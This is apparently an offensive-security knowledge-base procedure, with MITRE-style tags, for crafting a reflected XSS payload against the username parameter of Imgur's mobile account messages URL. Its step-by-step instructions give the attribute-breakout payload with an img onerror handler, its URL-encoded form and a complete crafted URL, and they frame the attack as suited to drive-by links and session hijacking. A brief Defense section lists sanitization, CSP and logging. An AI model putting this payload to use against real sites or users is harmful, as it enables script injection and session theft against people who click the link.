---
id: p1b2c3d4-e5f6-7890-abcd-ef1234567892
tags:
  - xss-payload
  - url-encoding
type: procedure
tools:
  - '[[tools/Google-Chrome]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:43.956Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-Reflected-XSS-Payload-for-Username

## Summary

This procedure constructs a URL-encoded XSS payload targeting the username parameter in Imgur's mobile account messages endpoint, exploiting the lack of sanitization for angle brackets to inject HTML and JavaScript.

## Description

The vulnerability arises because the mobile site reflects the username directly into the HTML without escaping < and > characters. By closing the attribute with a quote and injecting an <img> tag with an onerror handler, arbitrary JavaScript can be executed in the browser context. This is useful for drive-by attacks where victims are tricked into clicking a link, leading to session hijacking on m.imgur.com.

## Requirements

1. Knowledge of URL encoding for payloads
2. Access to a text editor or browser console for construction
3. Mobile User-Agent already set from prior procedure

## Defense

Defensive measures and detection strategies:

- Sanitize all user inputs in URL parameters, especially angle brackets.
- Implement Content Security Policy (CSP) to restrict inline scripts.
- Log and monitor for suspicious payloads in URL parameters.

## Objectives

1. Create an injectable payload that breaks out of the HTML attribute.
2. Ensure the payload executes JavaScript reliably.
3. Encode to evade basic filters.

## Instructions

### Step 1: Identify Base Endpoint

**Context**: Start with the vulnerable URL structure for the account messages page.

Base: `https://m.imgur.com/account/{username}/messages`.

Replace {username} with a benign string like `testcatplzignore`.

### Step 2: Append and Encode Payload

**Context**: Add the XSS payload after the username, URL-encoding special characters to ensure delivery.

Payload: `""><img src=x onerror=prompt(document.domain)>`.

Encoded: `%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3E`.

Full URL: `https://m.imgur.com/account/testcatplzignore%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3E/messages`.

**Expected Output**: Encoded URL that, when decoded, injects the <img> tag.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Google-Chrome]]

## Tags

- [[xss-payload]]
- [[url-encoding]]
